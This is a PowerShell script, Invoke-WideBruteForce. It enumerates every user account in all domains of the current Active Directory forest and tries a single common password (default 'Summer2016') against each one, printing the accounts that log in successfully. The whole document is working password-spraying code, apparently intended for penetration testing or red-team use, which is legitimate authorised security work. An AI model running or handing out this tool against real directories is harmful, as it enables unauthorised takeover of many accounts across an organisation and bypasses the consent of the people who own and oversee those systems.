<#
    Author: Itamar Mizrahi (@Zecured)
    License: GNU v3
    Required Dependencies: None
    Optional Dependencies: None
#>

function Invoke-WideBruteForce
{
<#
    .SYNOPSIS
        This tool tries a given password on all the users within the current directory (the entire forest).
        Author: Itamar Mizrahi (@Zecured)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION

    .PARAMETER Password
    Common\Default password to use.
        
    .EXAMPLE 
       
#>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$False, Position=0, ValueFromPipeline=$True)]
        [string]$Password = "Summer2016"

    )

    
    Function Test-ADAuthentication {
        param($Username,$Password)
        (new-object directoryservices.directoryentry "",$Username,$Password).psbase.name -ne $null
    }


    $AllUsers = @()
    $objForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($objForest.Domains)
    foreach ($Domain in $DomainList)
    {
        $strFilter = "(objectCategory=User)"
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher($Domain.GetDirectoryEntry())
        $objSearcher.PageSize = 10000
        $objSearcher.Filter = $strFilter
        $objSearcher.SearchScope = "Subtree"
        $objSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
        $colResults = $objSearcher.FindAll()
        foreach ($objResult in $colResults)
        {
        
            $AllUsers += $Domain.name.ToString() + "\" + $objResult.Properties.Item("samaccountname")
        }
    }

    foreach ($user in $AllUsers)
    {
        if(Test-ADAuthentication $user $password)
        {
            Write-Host $user
            Start-Sleep -Seconds 30
        }
    }
}